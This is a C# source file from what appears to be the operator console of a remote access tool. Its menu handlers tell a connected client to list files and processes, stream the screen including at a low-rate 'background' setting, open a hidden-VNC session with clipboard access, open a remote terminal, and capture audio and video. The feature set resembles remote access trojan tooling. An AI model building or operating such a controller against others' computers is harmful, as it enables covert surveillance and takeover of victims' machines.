using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void onMenuFileManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 切换到文件管理选项卡
            ShowTabFeature(FileManagerTabIndex);
            currentSession.Send(ePacketType.PACKET_GET_DRIVES_REQUEST, null);
        }

        private void onMenuScreenCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            toolStripButton3_Click(sender, e);
        }

        private void onMenuHDScreen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 确保 Relay 绑定指向当前客户端
            if (RSCApplication.oRemoteControlServer != null)
                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            frm.Show();
            // 自动发送高帧率请求
            RequestStartGetScreen req = new RequestStartGetScreen();
            req.fps = 5;
            currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void onMenuBackgroundScreen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 确保 Relay 绑定指向当前客户端
            if (RSCApplication.oRemoteControlServer != null)
                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            frm.Show();
            // 后台低帧率屏幕捕获
            RequestStartGetScreen req = new RequestStartGetScreen();
            req.fps = 1;
            currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void onMenuHVNC(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 确保 Relay 绑定指向当前客户端
            if (RSCApplication.oRemoteControlServer != null)
                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
            var frm = new FrmHVNC(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionHVNCScreenHandlers.ContainsKey(sessionId))
                this.sessionHVNCScreenHandlers.Add(sessionId, frm.HandleScreen);
            else
                this.sessionHVNCScreenHandlers[sessionId] = frm.HandleScreen;

            if (!this.sessionHVNCStartHandlers.ContainsKey(sessionId))
                this.sessionHVNCStartHandlers.Add(sessionId, frm.HandleStartResponse);
            else
                this.sessionHVNCStartHandlers[sessionId] = frm.HandleStartResponse;

            if (!this.sessionHVNCClipboardHandlers.ContainsKey(sessionId))
                this.sessionHVNCClipboardHandlers.Add(sessionId, frm.HandleClipboardResponse);
            else
                this.sessionHVNCClipboardHandlers[sessionId] = frm.HandleClipboardResponse;

            frm.Show();
        }

        private void onMenuSystemManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            // 切换到进程管理Tab并刷新进程列表
            ShowTabFeature(ProcessManagerTabIndex);
            currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
        }

        private void onMenuVideoCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            toolStripButtonCaptureVideo_Click(sender, e);
        }

        private void onMenuRemoteTerminal(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            ShowTabFeature(RemoteCommandTabIndex);
        }

        private void onMenuAudioCapture(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenAudioMonitorForm();
        }

    }
}
